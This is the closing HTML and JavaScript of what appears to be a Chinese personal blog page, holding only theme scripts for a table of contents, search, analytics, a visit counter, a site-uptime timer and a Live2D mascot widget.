            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fa fa-list"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            // headingsOffset: -205,
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).slideUp(500);
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).slideDown(500);
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>
    

</main>


<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>

<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>


    <footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            &copy; 2021-2099 Ash. 版权所有

            
            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
            <span class="white-color">21.3k</span>
            

            <br>
            <span id="sitetime"></span>

            
            
        </div>
        <div class="col s12 m4 l4 social-link ">






    <a href="http://wpa.qq.com/msgrd?v=3&uin=779602274&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>





    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fa fa-rss"></i>
    </a>
</div>
    </div>
</footer>

<div class="progress-bar"></div>

<!-- 不蒜子计数初始值纠正 -->
<script>
    $(document).ready(function () {

        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
        var pvcountOffset = 80000;  // 初始化首次数据
        var uvcountOffset = 20000;

        function fixCount() {
            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
                clearInterval(int);
            }
            if ($("#busuanzi_container_site_pv").css("display") != "none") {
                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
                clearInterval(int); // 停止检测
            }
        }
    });
</script>


<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
        var t1 = Date.UTC(2021, 09, 27, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
    siteTime();
</script>

    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "404", clearTimeout(st)) : (document.title = "嘿嘿又连上了", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
    </script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1YGRSHLKP3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-1YGRSHLKP3');
</script>

    
    <script src="/libs/others/clicklove.js"></script>
    

    

    <!-- 雪花特效 -->
    
   
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"live2d-widget-model-shizuku"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=(n.imageLazyLoadSetting.preloadRatio,Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight+360||document.documentElement.clientHeight+360)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>

</html>